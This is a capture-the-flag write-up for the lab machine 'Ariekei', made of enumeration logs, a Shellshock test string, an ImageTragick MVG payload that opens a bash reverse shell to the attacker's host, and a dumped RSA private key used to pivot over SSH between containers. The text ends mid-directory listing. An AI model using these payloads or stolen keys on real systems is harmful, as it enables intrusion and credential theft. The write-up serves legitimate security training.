#### Ariekei

- [Attacker Info](#attacker-info)
- [Victim Architecture](#victim-architecture)
- [Nmap Scan](#nmap-scan)
- [Web Enumeration](#web-enumeration)
- [ImageTragick](#imagetragick)
- [Local Port Forwarding](#local-port-forwarding)
- [SSH access to spanishdancer](#ssh-access-to-spanishdancer)
- [Privilege Escalation](#privilege-escalation)

###### Attacker Info

```sh
root@kali:~/ariekei# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:b0:a9:19 brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.8/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0
       valid_lft 86289sec preferred_lft 86289sec
    inet6 fe80::20c:29ff:feb0:a919/64 scope link noprefixroute
       valid_lft forever preferred_lft forever
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
    link/none
    inet 10.10.14.16/23 brd 10.10.15.255 scope global tun0
       valid_lft forever preferred_lft forever
    inet6 dead:beef:2::100e/64 scope global
       valid_lft forever preferred_lft forever
    inet6 fe80::681d:506d:7369:9c14/64 scope link stable-privacy
       valid_lft forever preferred_lft forever
root@kali:~/ariekei#
```

###### Victim Architecture

![](images/1.png)

###### Nmap Scan

```sh
root@kali:~/ariekei# nmap -sC -sV -oA ariekei.nmap 10.10.10.65
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-05 14:49 EDT
Nmap scan report for 10.10.10.65
Host is up (0.18s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)
|   256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)
|_  256 51:9f:87:64:be:99:35:2a:80:a6:a2:25:eb:e0:95:9f (ED25519)
443/tcp  open  ssl/http nginx 1.10.2
|_http-server-header: nginx/1.10.2
|_http-title: Site Maintenance
| ssl-cert: Subject: stateOrProvinceName=Texas/countryName=US
| Subject Alternative Name: DNS:calvin.ariekei.htb, DNS:beehive.ariekei.htb
| Not valid before: 2017-09-24T01:37:05
|_Not valid after:  2045-02-08T01:37:05
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|_  http/1.1
1022/tcp open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
|   2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
|   256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)
|_  256 ad:8d:4d:69:8e:7a:fd:d8:cd:6e:c1:4f:6f:81:b4:1f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.69 seconds
root@kali:~/ariekei#
```

![](images/2.png)

![](images/3.png)

###### Web Enumeration

```
https://10.10.10.65/
```

![](images/5.png)

```
DNS Name: calvin.ariekei.htb
DNS Name: beehive.ariekei.htb
```

![](images/4.png)

![](images/5.png)

![](images/6.png)

![](images/7.png)

![](images/8.png)

![](images/9.png)

```sh
root@kali:~/ariekei# gobuster -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -u https://10.10.10.65 -t 30 -k -s "200,204,301,302,307,403" -f

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.65/
[+] Threads      : 30
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes : 204,301,302,307,403,200
[+] Add Slash    : true
=====================================================
/cgi-bin/ (Status: 403)
/blog/ (Status: 200)
/icons/ (Status: 403)
```

```
https://10.10.10.65/blog/
```

![](images/10.png)

![](images/11.png)

![](images/12.png)

![](images/13.png)

![](images/14.png)

```
https://10.10.10.65/cgi-bin/stats
```

![](images/15.png)

![](images/16.png)

![](images/17.png)

```
() { :; }; echo; echo; /usr/bin/whoami
```

![](images/18.png)

![](images/19.png)

![](images/20.png)

```sh
root@kali:~/ariekei# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.10.65	calvin.ariekei.htb beehive.ariekei.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
root@kali:~/ariekei#
```

```
https://calvin.ariekei.htb/upload
```

![](images/21.png)

![](images/22.png)

![](images/23.png)

###### ImageTragick

[`ImageTragick`](https://imagetragick.com/)

[`Inside ImageTragick: The Real Payloads Being Used to Hack Websites`](https://blog.cloudflare.com/inside-imagetragick-the-real-payloads-being-used-to-hack-websites-2/)

![](images/24.png)

![](images/25.png)

![](images/26.png)

![](images/27.png)

`exploit.mvg`

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|setsid /bin/bash -i >& /dev/tcp/10.10.14.16/443 0<&1 2>&1")'
pop graphic-context
```

![](images/28.png)

[`Upgrading simple shells to fully interactive TTYs`](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

```sh
root@kali:~/ariekei# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.65] 51914
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
[root@calvin app]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@calvin app]# cd /root
cd /root/
[root@calvin ~]# ls
ls
anaconda-ks.cfg
[root@calvin ~]# python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
[root@calvin ~]# ^Z
[1]+  Stopped                 nc -nlvp 443
root@kali:~/ariekei# echo $TERM
xterm-256color
root@kali:~/ariekei# stty -a
speed 38400 baud; rows 51; columns 204; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = M-^?; eol2 = M-^?; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc ixany imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
root@kali:~/ariekei# stty raw -echo
root@kali:~/ariekei# nc -nlvp 443
                                 reset

[root@calvin ~]# export SHELL=bash
[root@calvin ~]# export TERM=xterm256-color
[root@calvin ~]# stty rows 51 columns 204
[root@calvin ~]# ifconfig
bash: ifconfig: command not found
[root@calvin ~]# ip addr
bash: ip: command not found
[root@calvin ~]# cd /proc/
[root@calvin proc]# ls
1   27         bus       cpuinfo    dma          filesystems  ioports   key-users    kpagecount  mdstat   mounts        partitions   self      swaps          thread-self  uptime             vmstat
13  40         cgroups   crypto     driver       fs           irq       keys         kpageflags  meminfo  mtrr          sched_debug  slabinfo  sys            timer_list   version            zoneinfo
15  acpi       cmdline   devices    execdomains  interrupts   kallsyms  kmsg         loadavg     misc     net           schedstat    softirqs  sysrq-trigger  timer_stats  version_signature
26  buddyinfo  consoles  diskstats  fb           iomem        kcore     kpagecgroup  locks       modules  pagetypeinfo  scsi         stat      sysvipc        tty          vmallocinfo
[root@calvin proc]# cd net/
[root@calvin net]# ls
anycast6   dev_snmp6     icmp6     ip6_flowlabel       ip6_tables_names    ip_tables_matches  mcfilter   netstat    ptype  rt6_stats  snmp6         stat  udp6      wireless
arp        fib_trie      if_inet6  ip6_mr_cache        ip6_tables_targets  ip_tables_names    mcfilter6  packet     raw    rt_acct    sockstat      tcp   udplite   xfrm_stat
dev        fib_triestat  igmp      ip6_mr_vif          ip_mr_cache         ip_tables_targets  netfilter  protocols  raw6   rt_cache   sockstat6     tcp6  udplite6
dev_mcast  icmp          igmp6     ip6_tables_matches  ip_mr_vif           ipv6_route         netlink    psched     route  snmp       softnet_stat  udp   unix
[root@calvin net]# cat fib_trie
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.23.0.0/24 2 0 2
        +-- 172.23.0.0/28 2 0 2
           |-- 172.23.0.0
              /32 link BROADCAST
              /24 link UNICAST
           |-- 172.23.0.11
              /32 host LOCAL
        |-- 172.23.0.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 172.23.0.0/24 2 0 2
        +-- 172.23.0.0/28 2 0 2
           |-- 172.23.0.0
              /32 link BROADCAST
              /24 link UNICAST
           |-- 172.23.0.11
              /32 host LOCAL
        |-- 172.23.0.255
           /32 link BROADCAST
[root@calvin net]#
[root@calvin net]# cat arp
IP address       HW type     Flags       HW address            Mask     Device
172.23.0.252     0x1         0x2         02:42:ac:17:00:fc     *        eth0
172.23.0.1       0x1         0x2         02:42:88:b1:00:b8     *        eth0
[root@calvin net]# cd /
[root@calvin /]# ls -lah
total 84K
drwxr-xr-x  36 root root 4.0K Nov 13  2017 .
drwxr-xr-x  36 root root 4.0K Nov 13  2017 ..
-rwxr-xr-x   1 root root    0 Nov 13  2017 .dockerenv
-rw-r--r--   1 root root  18K May 17  2016 anaconda-post.log
drwxr-xr-x   4 root root 4.0K Jun  5 19:56 app
lrwxrwxrwx   1 root root    7 May 17  2016 bin -> usr/bin
drwxr-xr-x   5 root root 4.0K Sep 23  2017 common
drwxr-xr-x   5 root root  360 Jun  4 02:28 dev
drwxr-xr-x  57 root root 4.0K Nov 13  2017 etc
drwxr-xr-x   2 root root 4.0K Aug 12  2015 home
lrwxrwxrwx   1 root root    7 May 17  2016 lib -> usr/lib
lrwxrwxrwx   1 root root    9 May 17  2016 lib64 -> usr/lib64
drwx------   2 root root 4.0K May 17  2016 lost+found
drwxr-xr-x   2 root root 4.0K Aug 12  2015 media
drwxr-xr-x   2 root root 4.0K Aug 12  2015 mnt
drwxr-xr-x   2 root root 4.0K Aug 12  2015 opt
dr-xr-xr-x 188 root root    0 Jun  4 02:28 proc
dr-xr-x---   4 root root 4.0K Nov 13  2017 root
drwxr-xr-x   2 root root 4.0K May 17  2016 run
lrwxrwxrwx   1 root root    8 May 17  2016 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Aug 12  2015 srv
dr-xr-xr-x  13 root root    0 Jun  4 02:28 sys
drwxrwxrwt   7 root root 4.0K Jun  5 19:56 tmp
drwxr-xr-x  19 root root 4.0K May 24  2016 usr
drwxr-xr-x  24 root root 4.0K May 24  2016 var
[root@calvin /]# cat .dockerenv
[root@calvin /]# cd common/
[root@calvin common]# ls -lah
total 20K
drwxr-xr-x  5 root root 4.0K Sep 23  2017 .
drwxr-xr-x 36 root root 4.0K Nov 13  2017 ..
drwxrwxr-x  2 root root 4.0K Sep 24  2017 .secrets
drwxr-xr-x  6 root root 4.0K Sep 23  2017 containers
drwxr-xr-x  2 root root 4.0K Sep 24  2017 network
[root@calvin common]# cd .secrets/
[root@calvin .secrets]# ls -lah
total 16K
drwxrwxr-x 2 root root 4.0K Sep 24  2017 .
drwxr-xr-x 5 root root 4.0K Sep 23  2017 ..
-r--r----- 1 root root 1.7K Sep 23  2017 bastion_key
-r--r----- 1 root root  393 Sep 23  2017 bastion_key.pub
[root@calvin .secrets]# cat bastion_key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA8M2fLV0chunp+lPHeK/6C/36cdgMPldtrvHSYzZ0j/Y5cvkR
SZPGfmijBUyGCfqK48jMYnqjLcmHVTlA7wmpzJwoZj2yFqsOlM3Vfp5wa1kxP+JH
g0kZ/Io7NdLTz4gQww6akH9tV4oslHw9EZAJd4CZOocO8B31hIpUdSln5WzQJWrv
pXzPWDhS22KxZqSp2Yr6pA7bhD35yFQ7q0tgogwvqEvn5z9pxnCDHnPeYoj6SeDI
T723ZW/lAsVehaDbXoU/XImbpA9MSF2pMAMBpT5RUG80KqhIxIeZbb52iRukMz3y
5welIrPJLtDTQ4ra3gZtgWvbCfDaV4eOiIIYYQIDAQABAoIBAQDOIAUojLKVnfeG
K17tJR3SVBakir54QtiFz0Q7XurKLIeiricpJ1Da9fDN4WI/enKXZ1Pk3Ht//ylU
P00hENGDbwx58EfYdZZmtAcTesZabZ/lwmlarSGMdjsW6KAc3qkSfxa5qApNy947
QFn6BaTE4ZTIb8HOsqZuTQbcv5PK4v/x/Pe1JTucb6fYF9iT3A/pnXnLrN9AIFBK
/GB02ay3XDkTPh4HfgROHbkwwverzC78RzjMe8cG831TwWa+924u+Pug53GUOwet
A+nCVJSxHvgHuNA2b2oMfsuyS0i7NfPKumjO5hhfLex+SQKOzRXzRXX48LP8hDB0
G75JF/W9AoGBAPvGa7H0Wen3Yg8n1yehy6W8Iqek0KHR17EE4Tk4sjuDL0jiEkWl
WlzQp5Cg6YBtQoICugPSPjjRpu3GK6hI/sG9SGzGJVkgS4QIGUN1g3cP0AIFK08c
41xJOikN+oNInsb2RJ3zSHCsQgERHgMdfGZVQNYcKQz0lO+8U0lEEe1zAoGBAPTY
EWZlh+OMxGlLo4Um89cuUUutPbEaDuvcd5R85H9Ihag6DS5N3mhEjZE/XS27y7wS
3Q4ilYh8Twk6m4REMHeYwz4n0QZ8NH9n6TVxReDsgrBj2nMPVOQaji2xn4L7WYaJ
KImQ+AR9ykV2IlZ42LoyaIntX7IsRC2O/LbkJm3bAoGAFvFZ1vmBSAS29tKWlJH1
0MB4F/a43EYW9ZaQP3qfIzUtFeMj7xzGQzbwTgmbvYw3R0mgUcDS0rKoF3q7d7ZP
ILBy7RaRSLHcr8ddJfyLYkoallSKQcdMIJi7qAoSDeyMK209i3cj3sCTsy0wIvCI
6XpTUi92vit7du0eWcrOJ2kCgYAjrLvUTKThHeicYv3/b66FwuTrfuGHRYG5EhWG
WDA+74Ux/ste3M+0J5DtAeuEt2E3FRSKc7WP/nTRpm10dy8MrgB8tPZ62GwZyD0t
oUSKQkvEgbgZnblDxy7CL6hLQG5J8QAsEyhgFyf6uPzF1rPVZXTf6+tOna6NaNEf
oNyMkwKBgQCCCVKHRFC7na/8qMwuHEb6uRfsQV81pna5mLi55PV6RHxnoZ2wOdTA
jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe
BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg==
-----END RSA PRIVATE KEY-----
[root@calvin .secrets]# cat bastion_key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka
[root@calvin .secrets]#
```

```sh
root@kali:~/ariekei# cat bastion_key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA8M2fLV0chunp+lPHeK/6C/36cdgMPldtrvHSYzZ0j/Y5cvkR
SZPGfmijBUyGCfqK48jMYnqjLcmHVTlA7wmpzJwoZj2yFqsOlM3Vfp5wa1kxP+JH
g0kZ/Io7NdLTz4gQww6akH9tV4oslHw9EZAJd4CZOocO8B31hIpUdSln5WzQJWrv
pXzPWDhS22KxZqSp2Yr6pA7bhD35yFQ7q0tgogwvqEvn5z9pxnCDHnPeYoj6SeDI
T723ZW/lAsVehaDbXoU/XImbpA9MSF2pMAMBpT5RUG80KqhIxIeZbb52iRukMz3y
5welIrPJLtDTQ4ra3gZtgWvbCfDaV4eOiIIYYQIDAQABAoIBAQDOIAUojLKVnfeG
K17tJR3SVBakir54QtiFz0Q7XurKLIeiricpJ1Da9fDN4WI/enKXZ1Pk3Ht//ylU
P00hENGDbwx58EfYdZZmtAcTesZabZ/lwmlarSGMdjsW6KAc3qkSfxa5qApNy947
QFn6BaTE4ZTIb8HOsqZuTQbcv5PK4v/x/Pe1JTucb6fYF9iT3A/pnXnLrN9AIFBK
/GB02ay3XDkTPh4HfgROHbkwwverzC78RzjMe8cG831TwWa+924u+Pug53GUOwet
A+nCVJSxHvgHuNA2b2oMfsuyS0i7NfPKumjO5hhfLex+SQKOzRXzRXX48LP8hDB0
G75JF/W9AoGBAPvGa7H0Wen3Yg8n1yehy6W8Iqek0KHR17EE4Tk4sjuDL0jiEkWl
WlzQp5Cg6YBtQoICugPSPjjRpu3GK6hI/sG9SGzGJVkgS4QIGUN1g3cP0AIFK08c
41xJOikN+oNInsb2RJ3zSHCsQgERHgMdfGZVQNYcKQz0lO+8U0lEEe1zAoGBAPTY
EWZlh+OMxGlLo4Um89cuUUutPbEaDuvcd5R85H9Ihag6DS5N3mhEjZE/XS27y7wS
3Q4ilYh8Twk6m4REMHeYwz4n0QZ8NH9n6TVxReDsgrBj2nMPVOQaji2xn4L7WYaJ
KImQ+AR9ykV2IlZ42LoyaIntX7IsRC2O/LbkJm3bAoGAFvFZ1vmBSAS29tKWlJH1
0MB4F/a43EYW9ZaQP3qfIzUtFeMj7xzGQzbwTgmbvYw3R0mgUcDS0rKoF3q7d7ZP
ILBy7RaRSLHcr8ddJfyLYkoallSKQcdMIJi7qAoSDeyMK209i3cj3sCTsy0wIvCI
6XpTUi92vit7du0eWcrOJ2kCgYAjrLvUTKThHeicYv3/b66FwuTrfuGHRYG5EhWG
WDA+74Ux/ste3M+0J5DtAeuEt2E3FRSKc7WP/nTRpm10dy8MrgB8tPZ62GwZyD0t
oUSKQkvEgbgZnblDxy7CL6hLQG5J8QAsEyhgFyf6uPzF1rPVZXTf6+tOna6NaNEf
oNyMkwKBgQCCCVKHRFC7na/8qMwuHEb6uRfsQV81pna5mLi55PV6RHxnoZ2wOdTA
jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe
BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg==
-----END RSA PRIVATE KEY-----
root@kali:~/ariekei#
root@kali:~/ariekei# chmod 600 bastion_key
```

```sh
[root@calvin /]# cd common/
[root@calvin common]# ls -l
total 8
drwxr-xr-x 6 root root 4096 Sep 23  2017 containers
drwxr-xr-x 2 root root 4096 Sep 24  2017 network
[root@calvin common]# cd network/
[root@calvin network]# ls -lah
total 52K
drwxr-xr-x 2 root root 4.0K Sep 24  2017 .
drwxr-xr-x 5 root root 4.0K Sep 23  2017 ..
-rw-r--r-- 1 root root  39K Sep 24  2017 info.png
-rwxr-xr-x 1 root root  437 Sep 23  2017 make_nets.sh
[root@calvin network]# cat make_nets.sh
#!/bin/bash

# Create isolated network for building containers. No internet access
docker network create -d bridge --subnet=172.24.0.0/24 --gateway=172.24.0.1 --ip-range=172.24.0.0/24 \
 -o com.docker.network.bridge.enable_ip_masquerade=false \
  arieka-test-net

# Crate network for live containers. Internet access
docker network create -d bridge --subnet=172.23.0.0/24 --gateway=172.23.0.1 --ip-range=172.23.0.0/24 \
 arieka-live-net
[root@calvin network]#
[root@calvin network]# cd ..
[root@calvin common]# cd containers/
[root@calvin containers]# ls -lah
total 24K
drwxr-xr-x 6 root root  4.0K Sep 23  2017 .
drwxr-xr-x 5 root root  4.0K Sep 23  2017 ..
drwxr-xr-x 2 root input 4.0K Nov 13  2017 bastion-live
drwxr-xr-x 5 root input 4.0K Nov 13  2017 blog-test
drwxr-xr-x 3 root root  4.0K Nov 13  2017 convert-live
drwxr-xr-x 5 root root  4.0K Nov 13  2017 waf-live
[root@calvin containers]#
[root@calvin containers]# cd waf-live/
[root@calvin waf-live]# ls -lah
total 132K
drwxr-xr-x 5 root root  4.0K Nov 13  2017 .
drwxr-xr-x 6 root root  4.0K Sep 23  2017 ..
drwxr-xr-x 8 root root  4.0K Sep 21  2017 .git
-rwxr-xr-x 1 root root   408 Sep 21  2017 Dockerfile
-rwxr-xr-x 1 root root   656 Sep 21  2017 Dockerfile.multi
-rwxr-xr-x 1 root root   408 Sep 21  2017 Dockerfile.single
-rw-r--r-- 1 root root   637 Sep 24  2017 ariekei.config
-rw-r--r-- 1 root root   952 Sep 24  2017 ariekei.csr
-rwxr-xr-x 1 root root    34 Sep 21  2017 build-docker.sh
-rwxr-xr-x 1 root root  1.1K Sep 21  2017 build.multi.sh
-rwxr-xr-x 1 root root  1.6K Sep 21  2017 build.sh
-rwxr-xr-x 1 root root   703 Sep 21  2017 config.multi.sh
-rwxr-xr-x 1 root root   31K Sep 21  2017 crs-setup.conf
-rwxr-xr-x 1 root root  1.1K Sep 21  2017 license.txt
drwxr-xr-x 2 root root  4.0K Jun  4 03:00 logs
-rwxr-xr-x 1 root root  1.4K Sep 24  2017 modsec_includes.conf
-rwxr-xr-x 1 root root  8.5K Sep 21  2017 modsecurity.conf
-rwxr-xr-x 1 root root  2.4K Sep 24  2017 nginx.conf
drwxr-xr-x 2 root root  4.0K Sep 21  2017 pages
-rwxr-xr-x 1 root root  4.5K Sep 21  2017 readme.md
-rw-r--r-- 1 root root  1.2K Sep 24  2017 ssl.crt
-rw-r--r-- 1 root root  1.7K Sep 22  2017 ssl.key
-rwxrwx--x 1 root input  732 Nov 13  2017 start.sh
[root@calvin waf-live]# cat ariekei.config
[req]
default_bits = 2048
default_md = 256
req_extentions = v3_req
distinguished_name = req_dn

[ req_dn ]
countryName = US
countryName_default = US
stateOrProvinceName = Texas
stateOrProvinceName_default = Texas
localityName = Dallas
localityName_default = Dallas
organizationalUnitName = Ariekei
organizationalUnitName_default = Ariekei
commonName = Ariekei - HackTheBox
commonName_max = 64

[ v3_req ]
# Extensions to add to a certificate request
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
subjectAltName = @alt_names

[alt_names]
DNS.1 = calvin.ariekei.htb
DNS.2 = beehive.ariekei.htb
[root@calvin waf-live]# cat start.sh
docker run --net arieka-live-net --ip 172.23.0.252 \
-v /dev/null:/root/.sh_history \
-v /dev/null:/root/.bash_history \
--restart on-failure:5 \
--link=blog-test \
--name waf-live -dit \
-v $(pwd)/pages:/usr/local/nginx/html:ro \
-v $(pwd)/nginx.conf:/usr/local/nginx/conf/nginx.conf:ro \
-v $(pwd)/modsec_includes.conf:/usr/local/nginx/conf/modsec_includes.conf:ro \
-v $(pwd)/modsecurity.conf:/usr/local/nginx/conf/modsecurity.conf:ro \
-v $(pwd)/crs-setup.conf:/usr/local/nginx/conf/rules/crs-setup.conf:ro \
-v $(pwd)/logs:/usr/local/nginx/logs \
-v /opt/docker:/common:ro \
-p 443:443 waf-template

# connect test network to allow proxying to test containers
docker network connect --ip 172.24.0.252 arieka-test-net  waf-live
[root@calvin waf-live]# ping 172.23.0.252
PING 172.23.0.252 (172.23.0.252) 56(84) bytes of data.
64 bytes from 172.23.0.252: icmp_seq=1 ttl=64 time=0.063 ms
64 bytes from 172.23.0.252: icmp_seq=2 ttl=64 time=0.086 ms
64 bytes from 172.23.0.252: icmp_seq=3 ttl=64 time=0.080 ms
^C
--- 172.23.0.252 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.063/0.076/0.086/0.012 ms
[root@calvin waf-live]#
```

```sh
root@kali:~/ariekei# ssh -i bastion_key 10.10.10.65
The authenticity of host '10.10.10.65 (10.10.10.65)' can't be established.
ECDSA key fingerprint is SHA256:00QUDuqn+W8071V5kz4hM6rnINCedq8xiLh4igg9+XM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.65' (ECDSA) to the list of known hosts.
root@10.10.10.65: Permission denied (publickey).
root@kali:~/ariekei#
```

```sh
root@kali:~/ariekei# ssh -i bastion_key -p 1022 10.10.10.65
The authenticity of host '[10.10.10.65]:1022 ([10.10.10.65]:1022)' can't be established.
ECDSA key fingerprint is SHA256:QgT9RAleDDDYJd1urpHktRWAjXUsNfdOU4G6p4fXDMY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[10.10.10.65]:1022' (ECDSA) to the list of known hosts.
Last login: Mon Nov 13 15:20:19 2017 from 10.10.14.2
root@ezra:~# ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:ac:17:00:fd
          inet addr:172.23.0.253  Bcast:0.0.0.0  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:306 errors:0 dropped:0 overruns:0 frame:0
          TX packets:93 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:28525 (28.5 KB)  TX bytes:21404 (21.4 KB)

eth1      Link encap:Ethernet  HWaddr 02:42:ac:18:00:fd
          inet addr:172.24.0.253  Bcast:0.0.0.0  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:70 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:5140 (5.1 KB)  TX bytes:0 (0.0 B)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:140 (140.0 B)  TX bytes:140 (140.0 B)

root@ezra:~# cd /
root@ezra:/# ls -lah
total 76K
drwxr-xr-x  52 root root 4.0K Nov 13  2017 .
drwxr-xr-x  52 root root 4.0K Nov 13  2017 ..
-rwxr-xr-x   1 root root    0 Nov 13  2017 .dockerenv
drwxr-xr-x   2 root root 4.0K Aug 17  2017 bin
drwxr-xr-x   2 root root 4.0K Apr 10  2014 boot
drwxr-xr-x   5 root root 4.0K Sep 23  2017 common
drwxr-xr-x   5 root root  360 Jun  4 02:29 dev
drwxr-xr-x  79 root root 4.0K Nov 13  2017 etc
drwxr-xr-x   2 root root 4.0K Apr 10  2014 home
drwxr-xr-x  14 root root 4.0K Sep 21  2017 lib
drwxr-xr-x   2 root root 4.0K Aug 17  2017 lib64
drwxr-xr-x   2 root root 4.0K Aug 17  2017 media
drwxr-xr-x   2 root root 4.0K Apr 10  2014 mnt
drwxr-xr-x   2 root root 4.0K Aug 17  2017 opt
dr-xr-xr-x 190 root root    0 Jun  4 02:29 proc
drwx------   4 root root 4.0K Nov 13  2017 root
drwxr-xr-x   9 root root 4.0K Jun  4 02:29 run
drwxr-xr-x   2 root root 4.0K Sep 13  2017 sbin
drwxr-xr-x   2 root root 4.0K Aug 17  2017 srv
dr-xr-xr-x  13 root root    0 Jun  5 20:06 sys
drwxrwxrwt   2 root root 4.0K Sep 21  2017 tmp
drwxr-xr-x  16 root root 4.0K Sep 21  2017 usr
drwxr-xr-x  19 root root 4.0K Nov 13  2017 var
root@ezra:/# cd common/
root@ezra:/common# ls -lahg
total 20K
drwxr-xr-x  5 root 4.0K Sep 23  2017 .
drwxr-xr-x 52 root 4.0K Nov 13  2017 ..
drwxrwxr-x  2 root 4.0K Sep 24  2017 .secrets
drwxr-xr-x  6 root 4.0K Sep 23  2017 containers
drwxr-xr-x  2 root 4.0K Sep 24  2017 network
root@ezra:/common# cd containers/
root@ezra:/common/containers# ls -lah
total 24K
drwxr-xr-x 6 root root 4.0K Sep 23  2017 .
drwxr-xr-x 5 root root 4.0K Sep 23  2017 ..
drwxr-xr-x 2 root  999 4.0K Nov 13  2017 bastion-live
drwxr-xr-x 5 root  999 4.0K Nov 13  2017 blog-test
drwxr-xr-x 3 root root 4.0K Nov 13  2017 convert-live
drwxr-xr-x 5 root root 4.0K Nov 13  2017 waf-live
root@ezra:/common/containers# cd convert-live/
root@ezra:/common/containers/convert-live# ls -lah
total 24K
drwxr-xr-x 3 root root 4.0K Nov 13  2017 .
